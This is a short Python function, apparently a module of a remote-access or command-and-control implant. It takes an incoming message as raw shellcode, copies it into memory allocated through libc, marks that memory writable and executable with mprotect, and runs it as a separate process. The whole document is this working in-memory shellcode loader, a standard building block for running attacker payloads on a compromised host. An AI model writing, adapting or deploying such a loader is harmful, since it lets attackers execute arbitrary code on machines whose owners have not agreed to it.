



def work( storage, message ) :
	from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE
	from multiprocessing import Process
	libc = CDLL('libc.so.6')
	shellcode = message

	sc = c_char_p(shellcode)
	size = len(shellcode)
	addr = c_void_p(libc.valloc(size))
	memmove(addr, sc, size)
	libc.mprotect(addr, size, 0x7)
	run = cast(addr, CFUNCTYPE(c_void_p))

	p = Process(target=run)				# run the shellcode as independent process
	p.start()
